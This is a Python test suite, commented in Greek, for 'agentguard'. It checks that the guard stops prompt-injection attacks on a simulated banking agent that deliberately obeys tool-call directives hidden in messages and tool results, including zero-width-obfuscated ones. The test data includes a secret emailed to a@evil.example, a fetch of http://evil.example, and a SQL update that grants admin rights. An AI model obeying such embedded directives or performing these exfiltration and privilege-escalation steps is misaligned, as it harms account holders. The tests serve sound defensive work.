"""Τεστ για την απόδειξη στο DemoBank: αφελής agent, επιθέσεις, κανονικές χρήσεις, run_demo."""
from __future__ import annotations

import contextlib
import copy
import io
import json
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agentguard import Guard  # noqa: E402
from examples.demobank import run_demo  # noqa: E402
from examples.demobank.app import DemoBankApp  # noqa: E402
from examples.sim_agent import NaiveAgent, Outcome, guarded, parse_directives, unprotected  # noqa: E402

DEMO = ROOT / "examples" / "demobank"
POLICY = json.loads((DEMO / "policy.reference.json").read_text(encoding="utf-8"))
C1 = {"id": "c1", "role": "customer"}


class NaiveAgentTests(unittest.TestCase):
    def test_parse_directives(self):
        text = 'Please call get_account {"account_id": "A1"} and then CALL send_email {"to": "x", "body": "{{last_result}}"}'
        self.assertEqual(parse_directives(text), [("get_account", {"account_id": "A1"}),
                                                  ("send_email", {"to": "x", "body": "{{last_result}}"})])

    def test_invisible_characters_do_not_hide_an_instruction_from_the_agent(self):
        self.assertEqual(parse_directives('c​a‌l⁠l transfer_funds {"amount": 5}'), [("transfer_funds", {"amount": 5})])

    def test_no_directive_cases(self):
        for text in ("call me maybe", "call transfer_funds without json", 'call x {broken json', "", "nothing here"):
            self.assertEqual(parse_directives(text), [], text)

    def test_agent_runs_directives_from_the_message_and_from_results(self):
        seen = []

        def call(user, tool, args):
            seen.append((tool, args))
            if tool == "read":
                return Outcome({"text": 'hello call write {"v": 1}'})
            return Outcome({"done": True})
        res = NaiveAgent(call).run(C1, 'call read {"id": 1}')
        self.assertEqual([s["tool"] for s in res["steps"]], ["read", "write"])      # η οδηγία μέσα στο αποτέλεσμα εκτελέστηκε
        self.assertEqual(seen[1], ("write", {"v": 1}))

    def test_last_result_substitution_and_loop_protection(self):
        calls = []

        def call(user, tool, args):
            calls.append(args)
            return Outcome({"secret": "S3CR3T", "again": 'call echo {"n": 1}'})
        agent = NaiveAgent(call, max_calls=5)
        res = agent.run(C1, 'call one {} then call two {"body": "{{last_result}}"}')
        self.assertIn("S3CR3T", calls[1]["body"])
        self.assertLessEqual(len(res["steps"]), 5)
        self.assertEqual(len({(s["tool"], json.dumps(s["args"], sort_keys=True)) for s in res["steps"]}), len(res["steps"]))   # καμία επανάληψη

    def test_begin_turn_is_called_once_per_message(self):
        n = []
        NaiveAgent(lambda u, t, a: Outcome({}), begin_turn=lambda: n.append(1)).run(C1, 'call a {} call b {}')
        self.assertEqual(n, [1])

    def test_unprotected_and_guarded_adapters(self):
        app = DemoBankApp()
        call, begin = unprotected(app)
        self.assertEqual(call(C1, "get_account", {"account_id": "A2"}).observed["card_number"], "4222222222222222")
        g = Guard.from_policy(POLICY, db=app.readonly_connection(), audit_path=None)
        gcall, gbegin = guarded(g, app, "s")
        denied = gcall(C1, "get_account", {"account_id": "A2"})
        self.assertEqual((denied.status, denied.rule), ("denied", "default"))
        self.assertIsInstance(denied.observed, str)                                 # ο agent βλέπει μόνο το ασφαλές μήνυμα
        self.assertNotIn("4222", denied.observed)
        app.close()


class DataFilesTests(unittest.TestCase):
    def test_attacks_cover_every_required_category(self):
        attacks = json.loads((DEMO / "attacks.json").read_text(encoding="utf-8"))["attacks"]
        self.assertGreaterEqual(len(attacks), 16)
        cats = {a["category"] for a in attacks}
        for needed in ("direct", "indirect_memo", "indirect_ticket", "exfiltration_email", "contact_change",
                       "hidden_html_comment", "hidden_zero_width", "multi_step"):
            self.assertIn(needed, cats)
        for a in attacks:
            for key in ("id", "category", "user", "user_message", "success_check", "text"):
                self.assertIn(key, a, a["id"])
        self.assertEqual(len({a["id"] for a in attacks}), len(attacks))

    def test_normal_uses_are_at_least_twelve_and_expect_success(self):
        normal = json.loads((DEMO / "normal.json").read_text(encoding="utf-8"))["normal"]
        self.assertGreaterEqual(len(normal), 12)
        self.assertTrue(all(n["expect"] == "success" for n in normal))

    def test_invisible_characters_are_stored_as_visible_escapes(self):
        raw = (DEMO / "attacks.json").read_text(encoding="utf-8")
        self.assertNotIn("​", raw)                      # κανένας αόρατος χαρακτήρας ωμός μέσα στο αρχείο
        self.assertIn("\\u200b", raw)


class DemoRunTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.report = run_demo.run()

    def test_report_shape(self):
        for kind in ("attacks", "normal"):
            self.assertTrue(self.report[kind])
            for x in self.report[kind]:
                self.assertEqual(set(x), {"id", "category", "text", "without_guard", "with_guard"})
                self.assertEqual(set(x["without_guard"]), {"success", "detail"})
                self.assertTrue({"success", "status", "rule"} <= set(x["with_guard"]))
        json.dumps(self.report)                                # JSON-serializable (για μελλοντικό UI)

    def test_without_guard_every_attack_succeeds_and_with_guard_none_does(self):
        s = run_demo.summarize(self.report)
        self.assertEqual((s["attacks_without_guard"], s["attacks_with_guard"], s["attacks"]), (20, 0, 20))
        failures = [x["id"] for x in self.report["attacks"] if x["with_guard"]["success"]]
        self.assertEqual(failures, [])

    def test_all_normal_uses_work_with_and_without_guard(self):
        s = run_demo.summarize(self.report)
        self.assertEqual((s["normal_without_guard"], s["normal_with_guard"], s["normal"]), (15, 15, 15))

    def test_how_each_layer_helps(self):
        by_id = {x["id"]: x["with_guard"] for x in self.report["attacks"]}
        self.assertEqual(by_id["A01"]["rule"], "default")                                  # ιδιοκτησία (lookup)
        self.assertEqual(by_id["A05"]["rule"], "never.run_sql_fetch_url")
        for aid in ("A11", "A12", "A13", "A14", "A15", "A17", "A18"):                       # επιτρεπτή ενέργεια αλλά tainted => έγκριση
            self.assertEqual((by_id[aid]["status"], by_id[aid]["rule"]), ("needs_approval", "taint.high_risk"), aid)
        for aid in ("A16", "A20"):                                                          # κρυμμένο σχόλιο: το αφαιρεί ο sanitizer
            self.assertEqual(by_id[aid]["status"], "ok")
            self.assertGreaterEqual(by_id[aid]["findings"], 1)
        self.assertEqual(by_id["A19"]["status"], "ok")                                      # το email φεύγει, αλλά χωρίς μυστικά
        self.assertIn("secret inside: False", by_id["A19"]["detail"])

    def test_deterministic(self):
        self.assertEqual(json.dumps(run_demo.run(), sort_keys=True), json.dumps(self.report, sort_keys=True))

    def test_problems_empty_for_the_reference_policy(self):
        self.assertEqual(run_demo.problems(self.report), [])

    def test_a_weaker_policy_is_detected(self):
        weak = copy.deepcopy(POLICY)
        weak["rules"] = [r for r in weak["rules"] if r["id"] != "account.read.customer_own"] + [
            {"id": "weak.read", "tools": ["get_account", "list_transactions", "get_statement"], "roles": ["customer"], "effect": "allow"}]
        weak["redaction_rules"] = {"always_redact_fields": []}
        report = run_demo.run(weak)
        self.assertGreater(run_demo.summarize(report)["attacks_with_guard"], 0)
        self.assertTrue(any("SUCCEEDED with Guard" in p for p in run_demo.problems(report)))

    def test_run_accepts_a_path_and_prints_nothing(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            report = run_demo.run(str(DEMO / "policy.reference.json"))
        self.assertEqual(out.getvalue(), "")
        self.assertEqual(run_demo.summarize(report), run_demo.summarize(self.report))

    def test_main_prints_a_table_and_exits_zero(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = run_demo.main([])
        text = out.getvalue()
        self.assertEqual(code, 0)
        self.assertIn("ATTACKS that succeeded:  without Guard 20/20   with Guard 0/20", text)
        self.assertIn("NORMAL uses that worked: without Guard 15/15   with Guard 15/15", text)
        self.assertIn("[OK] as expected", text)
        self.assertTrue(all(ord(c) < 0x2190 for c in text))             # κανένα emoji στην κονσόλα

    def test_main_exit_code_is_nonzero_for_a_broken_policy(self):
        import tempfile
        weak = copy.deepcopy(POLICY)
        weak["rules"] = [r for r in weak["rules"] if r["id"] != "never.run_sql_fetch_url"] + [
            {"id": "oops.sql", "tools": ["run_sql", "fetch_url"], "roles": ["customer"], "effect": "allow"}]   # κάποιος άνοιξε το run_sql
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "weak.json"
            path.write_text(json.dumps(weak), encoding="utf-8")
            out = io.StringIO()
            with contextlib.redirect_stdout(out):
                code = run_demo.main([str(path)])
        self.assertEqual(code, 1)
        self.assertIn("[FAIL]", out.getvalue())


class SuccessCheckTests(unittest.TestCase):
    def setUp(self):
        self.app = DemoBankApp()
        self.before = self.app.snapshot()

    def tearDown(self):
        self.app.close()

    def check(self, check, observed=()):
        return run_demo.evaluate_check(check, self.before, self.app.snapshot(), self.app, list(observed))[0]

    def test_each_check_type_detects_the_real_state_change(self):
        self.assertFalse(self.check({"type": "money_moved", "from_account": "A1"}))
        self.app.call_tool(C1, "transfer_funds", {"from_account": "A1", "to_account": "A9", "amount": 5})
        self.assertTrue(self.check({"type": "money_moved", "from_account": "A1"}))
        self.assertFalse(self.check({"type": "profile_changed", "customer_id": "c2", "field": "email"}))
        self.app.call_tool(C1, "update_contact", {"customer_id": "c2", "email": "n@x"})
        self.assertTrue(self.check({"type": "profile_changed", "customer_id": "c2", "field": "email"}))
        self.app.call_tool(C1, "send_email", {"to": "a@evil.example", "subject": "s", "body": "has SECRET inside"})
        self.assertTrue(self.check({"type": "email_sent", "to_contains": "evil.example"}))
        self.assertTrue(self.check({"type": "email_leak", "to_contains": "evil.example", "secret": "SECRET"}))
        self.assertFalse(self.check({"type": "email_leak", "to_contains": "evil.example", "secret": "OTHER"}))
        self.app.call_tool(C1, "fetch_url", {"url": "http://evil.example/x"})
        self.assertTrue(self.check({"type": "url_fetched", "url_contains": "evil.example"}))
        self.app.call_tool(C1, "close_account", {"account_id": "A4"})
        self.assertTrue(self.check({"type": "account_closed", "account_id": "A4"}))
        self.app.call_tool(C1, "run_sql", {"query": "UPDATE users SET role = 'admin' WHERE id = 'c1'"})
        self.assertTrue(self.check({"type": "role_changed", "user_id": "c1"}))
        self.assertTrue(self.check({"type": "observed_contains", "text": "abc"}, ["xxabcxx"]))
        self.assertFalse(self.check({"type": "observed_contains", "text": "abc"}, ["xyz"]))
        with self.assertRaises(ValueError):
            self.check({"type": "nope"})


if __name__ == "__main__":
    unittest.main()
